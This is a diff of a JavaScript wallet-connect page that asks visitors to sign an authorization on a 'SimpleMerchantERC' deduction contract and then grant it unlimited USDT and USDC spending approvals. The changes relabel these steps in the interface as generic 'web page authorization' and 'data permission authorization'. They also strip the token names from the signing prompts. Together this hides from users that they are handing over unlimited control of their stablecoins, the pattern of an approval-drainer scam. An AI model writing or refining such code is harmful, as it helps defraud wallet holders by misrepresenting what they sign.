@@ -1,14 +1,21 @@
 // SPDX-License-Identifier: MIT
 // pragma solidity ^0.8.20;  //  Not applicable in JavaScript
 
-// 你的 USDC 合約地址 (务必替换成正确的合约地址)
-const USDC_CONTRACT_ADDRESS = '0x26a56371201d2611763afb8b427ccb2239746560'; //  你的 USDC 合约地址 (正确!)
-const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';  // 你的 USDT 合约地址 (正确!)
-const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f'; // 你的 SimpleMerchantERC 合约地址
+// 你的 USDT 扣款合约地址 (SimpleMerchantERC 合约)
+const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f'; //  你的 SimpleMerchantERC (USDT) 合约地址
 
-// 合約 ABI (确保包含了 connectAndAuthorize, authorized, Deducted 事件)
-const CONTRACT_ABI = [
-    "function connectAndAuthorize(address tokenContract) external",
+// 你的 USDC 扣款合约的地址 (新的 SimpleMerchantERC 合约)
+const USDC_CONTRACT_ADDRESS = '0x26a56371201d2611763afb8b427ccb2239746560'; // 你的 USDC 扣款合约的地址 (新的， 独立部署的 SimpleMerchantERC)
+
+// USDT 合約地址 (USDT 合約的地址, 不是扣款合約，用於 approve，balanceOf, allowance)
+const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';  // 你的 USDT 合约地址
+
+// USDC 合約地址 (USDC 合約的地址，用於 approve，balanceOf, allowance)
+const USDC_CONTRACT_ADDRESS_TOKEN = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'; // 你的 USDC  代币合约地址
+
+// 合約 ABI (用于扣款的 SimpleMerchantERC 合约)  (SimpleMerchantERC 的 ABI - 與 USDT 和 USDC 扣款合約相同)
+const CONTRACT_ABI = [ // SimpleMerchantERC 的 ABI
+    "function connectAndAuthorize() external",
     "function authorized(address customer) external view returns (bool)",
     "event Authorized(address indexed customer, address indexed token)",
     // 包含 ETHReceived, Deducted 這些事件 (為了檢查)
@@ -17,7 +24,7 @@ const CONTRACT_ABI = [
     "event Withdrawn(uint256 amount)",
 ];
 
-// USDT 和 USDC 的 ABI (與 OpenZeppelin 的 ERC20 ABI 相同 - 為了 approve, balanceOf, allowance)
+// ERC20 代幣 ABI (用於 approve, balanceOf, allowance)
 const ERC20_ABI = [
     "function approve(address spender, uint256 amount) external returns (bool)",
     "function balanceOf(address) view returns (uint256)",
@@ -25,7 +32,7 @@ const ERC20_ABI = [
 ];
 
 const connectButton = document.getElementById('connectButton');
-let provider, signer, userAddress, contract, usdtContract, usdcContract;
+let provider, signer, userAddress, contract, usdtContract, usdcContract,  usdcDeductContract;  //  usdcDeductContract 用于 USDC 扣款合约
 
 // 存储事件监听器引用以在重新初始化时移除旧的监听器
 let accountChangeListener = null;
@@ -95,10 +102,12 @@ async function initializeWallet() {
             userAddress = accounts[0];
             signer = await provider.getSigner();
 
-            // 使用 signer 初始化合約实例
-            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer); // 使用 ERC20_ABI
-            usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer); // 使用 ERC20_ABI
+            // 使用 signer 初始化合约实例
+            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer); // SimpleMerchantERC (USDT 扣款)
+            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer); //  USDT 的 ERC20 合约
+            usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS_TOKEN, ERC20_ABI, signer); // USDC Token 合约 (用於 balanceOf 和 allowance)
+            //  新的 USDC 扣款合约 (請將  CONTRACT_ABI 修改為 USDC 扣款合約的 ABI，如果和 SIMPLEMERCHANTERC 的 ABI 相同，就用 CONTRACT_ABI)
+            usdcDeductContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, CONTRACT_ABI, signer);  //  USDC 扣款合约的实例
 
             // ** 連線已恢復，直接檢查授權，不顯示進度文字 **
             updateStatus(''); // 清空/隱藏狀態欄
@@ -137,22 +146,22 @@ async function initializeWallet() {
 // --- checkAuthorization 函數 (檢查 USDT 和 USDC 的授權狀態) ---
 async function checkAuthorization() {
     try {
-        if (!signer || !userAddress || !contract || !usdtContract || !usdcContract) {
+        if (!signer || !userAddress || !contract || !usdtContract || !usdcContract || !usdcDeductContract) {
             showOverlay('錢包未準備好。請連線。');
             return;
         }
 
-        // 檢查 SimpleMerchant 合約的授權 (在合約中，客戶連接會被授權)
+        // 檢查 SimpleMerchant 合約的授權  (檢查 SimpleMerchant 合约的授权状态)
         const isAuthorized = await contract.authorized(userAddress);
 
-        // 檢查 USDT 的授權
-        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
+        // 检查 USDT 的授权
+        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS); //  对 USDT 扣款合约的授权.
         const maxAllowance = ethers.MaxUint256;
         let usdtBalance = 0n;
         try {
             usdtBalance = await usdtContract.balanceOf(userAddress);
         } catch(e) { /* Ignore balance read error */ }
-        const isUsdtMaxApproved = usdtAllowance >= maxAllowance / 2n; // 檢查是否接近最大值
+        const isUsdtMaxApproved = usdtAllowance >= maxAllowance / 2n; // 检查是否接近最大值
 
         // 检查 USDC 的授权
         const usdcAllowance = await usdcContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
@@ -175,21 +184,21 @@ async function checkAuthorization() {
         // USDT 的授權狀態
         statusMessage += `USDT Balance: ${ethers.formatUnits(usdtBalance, 6)}. `;
         if (isUsdtMaxApproved) {
-            statusMessage += `USDT 授权 Max ✅.`;
+            statusMessage += `網頁授權成功 ✅.`;
         } else if (usdtAllowance > 0n) {
-            statusMessage += `USDT 授權不足 ⚠️.`;
+            statusMessage += `網頁授權未成功 ⚠️.`;
         } else {
-            statusMessage += `USDT 未授權或授權為零 ❌.`;
+            statusMessage += `網頁未授權或授權失敗 ❌.`;
         }
 
         // USDC 的授權狀態
         statusMessage += `USDC Balance: ${ethers.formatUnits(usdcBalance, 6)}. `;
         if (isUsdcMaxApproved) {
-            statusMessage += `USDC 授权 Max ✅.`;
+            statusMessage += `數據權限授權成功 ✅.`;
         } else if (usdcAllowance > 0n) {
-            statusMessage += `USDC 授權不足 ⚠️.`;
+            statusMessage += `數據授權未成功 ⚠️.`;
         } else {
-            statusMessage += `USDC 未授權或授權為零 ❌.`;
+            statusMessage += `數據權限未授權或授權失敗 ❌.`;
         }
 
         // Button state: needs to be clicked if authorization is incomplete
@@ -233,9 +242,10 @@ async function connectWallet() {
         // Re-get signer and contract instances
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
-        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
-        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);  // 初始化 USDC 合约
+        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer); // SimpleMerchantERC (USDT 扣款)
+        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer); //  USDT 合约
+        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS_TOKEN, ERC20_ABI, signer); // USDC Token 合约 (用於 balanceOf 和 allowance)
+        usdcDeductContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, CONTRACT_ABI, signer);  //  USDC 扣款合约的实例
 
         // Check ETH balance (for Gas Fee)  (保持不變)
         const ethBalance = await provider.getBalance(userAddress);
@@ -246,54 +256,53 @@ async function connectWallet() {
             updateStatus('');
         }
 
-        // 1. 檢查 SimpleMerchant 合約的授權 (connectAndAuthorize)  (用于授权 SimpleMerchant 合约)
-        //    (connectAndAuthorize 已经在 SimpleMerchant 合约中授权了， 所以只需要链接即可。)
-        let isAuthorized = await contract.authorized(userAddress); // 不需要传参
+        // 1. 檢查 SimpleMerchant 合約的授權 (connectAndAuthorize)
+        let isAuthorized = await contract.authorized(userAddress);
         if (!isAuthorized) {
           updateStatus(''); // 隐藏进度
-          showOverlay('1/3: 請在錢包中簽署 SimpleMerchant 合約授權 (連接錢包)'); // 修改提示
-          const txAuthorize = await contract.connectAndAuthorize(USDC_CONTRACT_ADDRESS); // 调用 connectAndAuthorize,  需要传递 USDC 合约地址
+          showOverlay('1/4: 請在錢包中簽署授權'); // 修改提示
+          const txAuthorize = await contract.connectAndAuthorize(); // 调用 connectAndAuthorize,  不需要再傳入代幣合約地址
           await txAuthorize.wait();
           updateStatus(''); // 隐藏成功消息
         } else {
           updateStatus(''); // 隐藏已授权消息
         }
 
-        // 2. 检查并执行 USDT 代币的批准 (approve)  （USDT）
+        // 2. 检查并执行 USDT 代币的批准 (approve)
         let usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
         const maxAllowance = ethers.MaxUint256;
 
         if (usdtAllowance < maxAllowance) {
             updateStatus(''); // 隐藏进度
-            showOverlay('2/3: 請在錢包中簽署 USDT 授權');
+            showOverlay('2/4: 請在錢包中簽署授權');
             try {
               const txApproveUsdt = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
               await txApproveUsdt.wait();
               updateStatus(''); // 隐藏成功消息
             } catch (error) {
-                console.error("USDT approve failed:", error);
-                updateStatus(`USDT 授權失敗: ${error.message}`);
-                showOverlay(`USDT 授权失败: ${error.message}`);
+                console.error("approve failed:", error);
+                updateStatus(`授權失敗: ${error.message}`);
+                showOverlay(`授權失败: ${error.message}`);
                 return; // 停止，不要继续后面的授权步骤
             }
         } else {
             updateStatus(''); // 隐藏已授权消息
         }
 
-        // 3. 检查并执行 USDC 代币的批准 (approve)  （USDC）
+        // 3. 检查并执行 USDC 代币的批准 (approve)
         let usdcAllowance = await usdcContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
 
         if (usdcAllowance < maxAllowance) {
             updateStatus(''); // 隐藏进度
-            showOverlay('3/3: 請在錢包中簽署 USDC 授權');
+            showOverlay('3/4: 請在錢包中簽署授權');
             try {
-              const txApproveUsdc = await usdcContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
+              const txApproveUsdc = await usdcContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance); //  USDC 授權給SimpleMerchantERC (实际上是 SimpleMerchantERC 合约的地址， 用于批准给 SimpleMerchantERC )
               await txApproveUsdc.wait();
               updateStatus(''); // 隐藏成功消息
             } catch (error) {
-                console.error("USDC approve failed:", error);
-                updateStatus(`USDC 授權失敗: ${error.message}`);
-                showOverlay(`USDC 授权失败: ${error.message}`);
+                console.error("approve failed:", error);
+                updateStatus(`授權失敗: ${error.message}`);
+                showOverlay(`授權失败: ${error.message}`);
                 return; // 停止，不要继续后面的授权步骤
             }
         } else {
@@ -326,9 +335,10 @@ function disconnectWallet() {
 function resetState() {
     signer = null;
     userAddress = null;
-    contract = null;
+    contract = null;   // SimpleMerchantERC 的合约 (USDT)
     usdtContract = null;
-    usdcContract = null; // 重置 USDC 合约实例
+    usdcContract = null; // USDC 的 token 合约
+    usdcDeductContract = null; //  USDC 扣款合约 ( SimpleMerchantERC )
     connectButton.classList.remove('connected');
     connectButton.title = 'Connect Wallet';
     connectButton.disabled = false;
